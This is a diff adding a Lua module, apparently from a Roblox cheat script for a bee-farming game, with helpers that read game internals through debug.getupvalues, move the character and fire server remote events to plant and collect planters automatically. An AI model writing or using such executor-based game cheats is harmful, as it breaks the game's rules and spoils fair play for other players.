+            if nAPI:getPlanterLocation(v.PotModel.PrimaryPart) == field then
+                isOccupied = true
+            end
+        end
+    end
+    return isOccupied
+end
+
+function nAPI:fetchAllPlanters()
+    local p = {}
+    local concaccon = require(game:GetService("ReplicatedStorage").LocalPlanters)
+    local concacbo = concaccon.LoadPlanter
+    local PlanterTable = debug.getupvalues(concacbo)[4]
+    
+    for k,v in pairs(PlanterTable) do 
+        if v.PotModel and v.PotModel.Parent and v.IsMine == true then
+            p[k]=v
+        end
+    end
+    return p
+end
+
+function nAPI:isNectarPending(nectartype)
+    local planterz = nAPI:fetchAllPlanters()
+    local isPending = false
+    for i,v in pairs(planterz) do
+        local location = nAPI:getPlanterLocation(v.PotModel.PrimaryPart)
+        if location then
+            local conftype = nAPI:getNectarFromField(location)
+            if conftype then
+                if conftype == nectartype then isPending = true end
+            end
+        end
+    end
+    return isPending
+end
+
+function nAPI:fetchBestFieldWithNectar(nectar)
+    local bestField = "None"
+    local nectarFields = nectarData[nectar]
+    local fieldPlaceholderValue = ""
+    
+    repeat wait(0.01)
+    local randomField = nectarFields[math.random(1,#nectarFields)]
+    if randomField then fieldPlaceholderValue = randomField end
+    until nAPI:isFieldOccupied(fieldPlaceholderValue) == false
+    
+    bestField = fieldPlaceholderValue
+    
+    return bestField
+end
+
+function nAPI:checkIfPlanterExists(pNum)
+    local exists = false
+    local stuffs = nAPI:fetchAllPlanters() 
+    if stuffs ~= {} then
+        for i,v in pairs(stuffs) do
+            if v["ActorID"] == pNum then exists = true end
+        end
+    end
+    return exists
+end
+
+function nAPI:collectSpecificPlanter(prt,id)
+    if prt then
+        if game.Players.LocalPlayer.Character then
+            if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            api.tween(5,prt.CFrame)
+            wait(0.1)
+            game:GetService("ReplicatedStorage").Events.PlanterModelCollect:FireServer(id)
+            end
+        end
+    end
+end
+
+function nAPI:RequestCollectPlanters(planterTable)
+    spawn(function()
+    local plantersToCollect = {}
+    if planterTable then
+        for i,v in pairs(planterTable) do
+            if v["GrowthPercent"] ~= nil then
+                if v["GrowthPercent"] >= (getgenv().growthCollectionPercent/100) then
+                    table.insert(plantersToCollect,{["PM"]=v["PotModel"].PrimaryPart; ["AID"]=v["ActorID"]})
+                end
+            end
+        end
+    end
+    if plantersToCollect ~= {} then
+        for i,v in pairs(plantersToCollect) do
+            repeat wait(0.7)
+            nAPI:collectSpecificPlanter(v["PM"],v["AID"])
+            until nAPI:checkIfPlanterExists(v["AID"]) == false
+            getgenv().plLootCollection = true
+            wait(5)
+            getgenv().plLootCollection = false
+        end
+    end
+    end)
+end
+
+function nAPI:PlantPlanter(name,field)
+    if field and name then
+        local specField = game:GetService("Workspace").FlowerZones:FindFirstChild(field)
+        if specField ~= nil then
+            local attempts = 0
+            repeat wait(0.1)
+                if game.Players.LocalPlayer.Character then
+                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        api.tween(5,specField.CFrame)
+                        wait(0.2)
+                        game:GetService("ReplicatedStorage").Events.PlayerActivesCommand:FireServer({["Name"]=name.." Planter"})
+                    end
+                    attempts = attempts + 1
+                end
+            until nAPI:GetPlanterData(name) ~= nil or attempts == 15
+        end
+    end
+end
+
+function nAPI:getNectarFromField(field)
+    local foundnectar = nil
+    for i,v in pairs(nectarData) do
+        for k,p in pairs(v) do
+            if p == field then
+                foundnectar = i
+            end
+        end
+    end
+    return foundnectar
+end
+
+function nAPI:fetchNectarBlacklist(manbl)
+    local nblacklist = {}
+    for i,v in pairs(nectarData) do
+        if nAPI:isNectarPending(i) == true then table.insert(nblacklist,i) end
+    end
+    for i,v in pairs(manbl) do
+        local exists = false
+        for k,e in pairs(nblacklist) do
+            if e == v then exists = true end
+        end
+        if exists == false then
+            table.insert(nblacklist,v)
+        end
+    end
+    return nblacklist
+end
+
+function nAPI:formatString(Planter, Field, Nectar)
+    return "You should plant a " .. Planter .. " Planter in the " .. Field .. " to get " .. Nectar .. " Nectar."
+end
+
+return nAPI,planterData
